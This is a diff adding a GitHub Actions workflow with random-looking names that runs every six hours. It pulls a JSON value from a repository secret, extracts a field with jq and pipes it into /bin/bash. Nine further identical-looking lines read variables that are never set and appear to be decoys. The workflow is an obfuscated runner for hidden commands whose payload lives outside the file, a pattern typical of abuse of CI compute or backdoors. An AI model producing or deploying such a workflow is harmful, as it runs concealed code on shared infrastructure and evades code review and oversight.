@@ -1,0 +1,28 @@
+name: chumaitian3189
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chumaitian3189
+        env:
+          svza67270: ${{ secrets.svza67270 }}
+        run: |
+          echo $svza67270 | jq -r .vub789 | /bin/bash
+          echo $g6021 | jq -r .k2250 | /bin/bash
+          echo $l3 | jq -r .bf986 | /bin/bash
+          echo $qo0803 | jq -r .fcuhi773 | /bin/bash
+          echo $o1 | jq -r .i4 | /bin/bash
+          echo $sg31 | jq -r .nkq6 | /bin/bash
+          echo $zstar2826 | jq -r .leh348 | /bin/bash
+          echo $jrb19631 | jq -r .tvbe445 | /bin/bash
+          echo $nna8240 | jq -r .sdst44873 | /bin/bash
+          echo $lnhb25 | jq -r .pgph3 | /bin/bash
+
